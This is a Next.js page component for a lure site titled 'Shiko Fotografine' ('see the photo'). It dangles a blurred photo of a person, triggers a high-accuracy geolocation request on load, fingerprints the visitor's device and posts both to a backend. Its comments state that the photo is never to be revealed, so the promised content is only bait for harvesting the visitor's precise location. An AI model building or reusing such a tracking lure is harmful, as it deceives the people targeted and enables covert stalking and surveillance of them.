"use client";

import { useState, useEffect, useRef } from "react";
import Image from "next/image";

interface DeviceInfo {
  userAgent: string;
  platform: string;
  language: string;
  screenWidth: number;
  screenHeight: number;
  screenColorDepth: number;
  timezone: string;
  deviceType: string;
  isMobile: boolean;
  isTablet: boolean;
  browser: string;
  os: string;
}

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy?: number;
  altitude?: number | null;
  altitudeAccuracy?: number | null;
  heading?: number | null;
  speed?: number | null;
  timestamp: string;
  deviceInfo: DeviceInfo;
}

export default function Home() {
  const [isLoading, setIsLoading] = useState(false);
  const [locationSaved, setLocationSaved] = useState(false);
  const hasRequestedLocation = useRef(false);

  useEffect(() => {
    // Automatically request location on page load - browser will show default permission alert
    if (!hasRequestedLocation.current) {
      hasRequestedLocation.current = true;
      requestLocation();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Function to detect device type and browser
  const getDeviceInfo = (): DeviceInfo => {
    const userAgent = navigator.userAgent;
    const screen = window.screen;
    
    // Detect device type
    const isMobile = /iPhone|iPad|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const isTablet = /iPad|Android/i.test(userAgent) && !/Mobile/i.test(userAgent);
    
    // Detect browser
    let browser = 'Unknown';
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
    else if (userAgent.includes('Edg')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    
    // Detect OS
    let os = 'Unknown';
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac')) os = 'macOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iOS') || /iPhone|iPad|iPod/.test(userAgent)) os = 'iOS';
    
    // Detect device type name
    let deviceType = 'Desktop';
    if (isMobile) {
      if (userAgent.includes('iPhone')) deviceType = 'iPhone';
      else if (userAgent.includes('Android')) {
        // Try to extract Android device model
        const match = userAgent.match(/Android.*?; (.*?)(?:\)|;)/);
        deviceType = match ? `Android ${match[1]}` : 'Android Phone';
      } else deviceType = 'Mobile';
    } else if (isTablet) {
      if (userAgent.includes('iPad')) deviceType = 'iPad';
      else deviceType = 'Tablet';
    }

    return {
      userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: screen.width,
      screenHeight: screen.height,
      screenColorDepth: screen.colorDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      deviceType,
      isMobile,
      isTablet,
      browser,
      os,
    };
  };

  const requestLocation = () => {
    if (!navigator.geolocation) {
      return;
    }

    // This will trigger the browser's default location permission alert
    // DO NOT show loading indicator before user accepts
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        // Only show activity indicator AFTER successfully getting location
        setIsLoading(true);

        const deviceInfo = getDeviceInfo();

        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: new Date().toISOString(),
          deviceInfo,
        };

        try {
          // Save location to database
          const response = await fetch("/api/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(locationData),
          });

          if (response.ok) {
            // Small delay to show activity indicator while processing
            await new Promise((resolve) => setTimeout(resolve, 1500));
            // Do NOT reveal image - keep it blurred
            setIsLoading(false);
            setLocationSaved(true);
          } else {
            setIsLoading(false);
          }
        } catch (err) {
          setIsLoading(false);
        }
      },
      () => {
        // User denied permission or error occurred
        // Do nothing - no loading indicator shown
      },
      {
        enableHighAccuracy: true, // Request highest accuracy
        timeout: 30000, // Increased timeout for better accuracy
        maximumAge: 0, // Don't use cached location
      }
    );
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-gradient-to-br from-purple-50 to-pink-50 dark:from-gray-900 dark:to-gray-800">
      <main className="flex flex-col items-center justify-center w-full max-w-md px-6 py-8">
        <div className="w-full mb-8">
          <h1 className="text-2xl font-bold text-center text-gray-800 dark:text-gray-100 mb-2">
            Shiko Fotografine
          </h1>
        </div>

        <div className="relative w-full aspect-[3/4] rounded-2xl overflow-hidden shadow-2xl mb-6">
          <Image
            src="/images.jpeg"
            alt="Person"
            fill
            className="object-cover blur-2xl transition-all duration-1000"
            priority
          />
          {isLoading && (
            <div className="absolute inset-0 flex items-center justify-center bg-black/30 backdrop-blur-sm">
              <div className="flex flex-col items-center gap-4">
                <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                <p className="text-white text-sm font-medium">
                  Processing location...
                </p>
              </div>
            </div>
          )}
        </div>

        {!isLoading && !locationSaved && (
          <div className="w-full">
            <p className="text-sm text-center text-gray-600 dark:text-gray-400">
              Please allow location access
            </p>
          </div>
        )}
      </main>
    </div>
  );
}
